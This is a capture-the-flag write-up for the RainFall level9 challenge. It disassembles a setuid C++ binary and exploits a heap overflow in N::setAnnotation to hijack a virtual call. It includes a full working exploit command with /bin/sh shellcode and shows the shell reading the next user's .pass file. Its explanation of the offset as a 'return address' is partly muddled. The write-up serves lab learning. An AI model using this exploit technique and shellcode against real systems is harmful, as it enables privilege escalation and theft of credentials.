# **Level9**

In this level, we found a binary file

```c
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and discovered this is a C++ program that uses Class inheritance and virtual functions and dynamic memory allocation and operator overloading

```nasm
; Check argc (must be > 1)
0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)       ; Compare argc with 1
0x08048602 <+14>:    jg     0x8048610            ; If argc > 1, continue
0x08048604 <+16>:    movl   $0x1,(%esp)          ; Else, prepare exit(1)
0x0804860b <+23>:    call   0x80484f0 <_exit@plt>; Call exit(1)

; Create first object (N* obj1 = new N(5))
0x08048610 <+28>:    movl   $0x6c,(%esp)         ; Size = 108 bytes
0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>; operator new
0x0804861c <+40>:    mov    %eax,%ebx            ; Save object pointer
0x0804861e <+42>:    movl   $0x5,0x4(%esp)       ; Parameter 5
0x08048626 <+50>:    mov    %ebx,(%esp)          ; this pointer
0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>; Call N::N(int)
0x0804862e <+58>:    mov    %ebx,0x1c(%esp)      ; Store obj1

; Create second object (N* obj2 = new N(6))
0x08048632 <+62>:    movl   $0x6c,(%esp)         ; Size = 108 bytes
0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>; operator new
0x0804863e <+74>:    mov    %eax,%ebx            ; Save object pointer
0x08048640 <+76>:    movl   $0x6,0x4(%esp)       ; Parameter 6
0x08048648 <+84>:    mov    %ebx,(%esp)          ; this pointer
0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>; Call N::N(int)
0x08048650 <+92>:    mov    %ebx,0x18(%esp)      ; Store obj2

; Store object pointers in local variables
0x08048654 <+96>:    mov    0x1c(%esp),%eax      ; Load obj1
0x08048658 <+100>:   mov    %eax,0x14(%esp)      ; Store in a
0x0804865c <+104>:   mov    0x18(%esp),%eax      ; Load obj2
0x08048660 <+108>:   mov    %eax,0x10(%esp)      ; Store in b

; Call setAnnotation with argv[1]
0x08048664 <+112>:   mov    0xc(%ebp),%eax       ; Get argv
0x08048667 <+115>:   add    $0x4,%eax            ; argv[1]
0x0804866a <+118>:   mov    (%eax),%eax          ; Get argv[1] string
0x0804866c <+120>:   mov    %eax,0x4(%esp)       ; Second parameter
0x08048670 <+124>:   mov    0x14(%esp),%eax      ; Load obj1 (a)
0x08048674 <+128>:   mov    %eax,(%esp)          ; First parameter (this)
0x08048677 <+131>:   call   0x804870e            ; Call setAnnotation

; Call virtual function (vulnerable part)
0x0804867c <+136>:   mov    0x10(%esp),%eax      ; Load obj2 (b)
0x08048680 <+140>:   mov    (%eax),%eax          ; Get vtable pointer
0x08048682 <+142>:   mov    (%eax),%edx          ; Get function pointer
0x08048684 <+144>:   mov    0x14(%esp),%eax      ; Load obj1 (a)
0x08048688 <+148>:   mov    %eax,0x4(%esp)       ; Parameter for virtual func
0x0804868c <+152>:   mov    0x10(%esp),%eax      ; Load obj2 (b)
0x08048690 <+156>:   mov    %eax,(%esp)          ; this pointer
0x08048693 <+159>:   call   *%edx                ; Call virtual function
```

**Listing Functions:**

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080485f4  main
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
[...]
```

The key functions identified are:

- **`main`**: The entry point of the program.
- **`N::N(int)`**: Constructor for the class **`N`**.
- **`N::setAnnotation(char*)`**: A method that accepts a **`char*`** argument.
- **`N::operator+(N&)`** and **`N::operator-(N&)`**: Overloaded operators for class **`N`**.

**Analyzing `main` Function:**

Disassembling the **`main`** function reveals:

1. **Argument Check**: The program checks if at least one argument is provided.
2. **Object Instantiation**:
    - Two objects of class **`N`** are created.
    - The first object is created with the integer **`5`**.
    - The second object is created with the integer **`6`**.
3. **Method Invocation**:
    - The **`setAnnotation`** method is called on the first object, passing **`argv[1]`** as an argument.
    
    ```nasm
    ; Get string length
    0x08048714 <+6>:     mov    0xc(%ebp),%eax       ; Load parameter (char* str)
    0x08048717 <+9>:     mov    %eax,(%esp)          ; Parameter for strlen
    0x0804871a <+12>:    call   0x8048520 <strlen@plt>; Get string length
    
    ; Calculate destination address (this->annotation)
    0x0804871f <+17>:    mov    0x8(%ebp),%edx       ; Load 'this' pointer
    0x08048722 <+20>:    add    $0x4,%edx            ; Point to annotation member (offset 4)
    
    ; Setup memcpy parameters
    0x08048725 <+23>:    mov    %eax,0x8(%esp)       ; Third param: length from strlen
    0x08048729 <+27>:    mov    0xc(%ebp),%eax       ; Load source string
    0x0804872c <+30>:    mov    %eax,0x4(%esp)       ; Second param: source
    0x08048730 <+34>:    mov    %edx,(%esp)          ; First param: destination
    
    ; Call memcpy and return
    0x08048733 <+37>:    call   0x8048510 <memcpy@plt>; Vulnerable memcpy call
    0x08048738 <+42>:    leave                       ; Restore stack frame
    0x08048739 <+43>:    ret                         ; Return
    ```
    
## **Vulnerability**

- **Use of `memcpy` without Bounds Checking**: The method copies the input string into an annotation buffer using **`memcpy`**, based on the length calculated by **`strlen`**.
- **Potential Buffer Overflow**: If the input string is larger than the allocated space for the annotation buffer, it can overwrite adjacent memory.

## **Exploit**

To exploit the buffer overflow in **`N::setAnnotation`** to overwrite critical data structures, leading to arbitrary code execution and privilege escalation.

**Finding the Offset:**

The offset to overwrite the return address is **76 bytes**, derived as follows:

**108 (total buffer size)** - **4 (address at 0x804a008)** - **24 (shellcode size)** - **4 (address at 0x0804a00c)**.

**First object start :**

```nasm
level9@RainFall:~$ ltrace ./level9 AAAA
[...]
; First object creation
_Znwj(108, 0xbffff7b4, 0xbffff7c0, 0xb7d79e55, 0xb7fed280) = 0x804a008
                                                              ^^^^^^^^^
                                                             ; First object address
; Second object creation
_Znwj(108, 5, 0xbffff7c0, 0xb7d79e55, 0xb7fed280) = 0x804a078

; String operations
strlen("AAAA") = 4
memcpy(0x0804a00c, "AAAA", 4) = 0x0804a00c
                   ^^^^^^^^^
                   ;Our input is copied here
[...]
level9@RainFall:~$
```

  0x804a008: First object start (vtable pointer)

Where our input is being copied:

• Note that this is 4 bytes after the first object (**`0x804a008 + 4`**)

0x804a00c:  Where our input starts (4 bytes after object start) (*0x804a008 + 4 = 0x804a00C*)

**Memory of the Object in the Program**

 The first object is allocated at `0x804a008`:

| Address | Field | Value/Description |
| --- | --- | --- |
| `0x804a008` | **vptr** | Points to the vtable of class `N`. |
| `0x804a00c` | `number` | The integer field (set to `5` initially). |
| `0x804a010` | `annotation` | Pointer to the annotation buffer or `NULL`. |
1. Run the exploit:

```nasm
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "Y" * 76 + "\x0c\xa0\x04\x08"')
```

- **`"\x10\xa0\x04\x08"`**: The address pointing to our shellcode.
- **`"<shellcode>"`**: The shellcode to be executed.
- **`"Y" * 76`**: Padding to fill the buffer up to the overwrite point.
- **`"\x0c\xa0\x04\x08"`**: The address to overwrite, redirecting execution.
1. Result:
    
    ```nasm
    $ whoami
    bonus0
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    ```
    

## **Flag**

```nasm
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```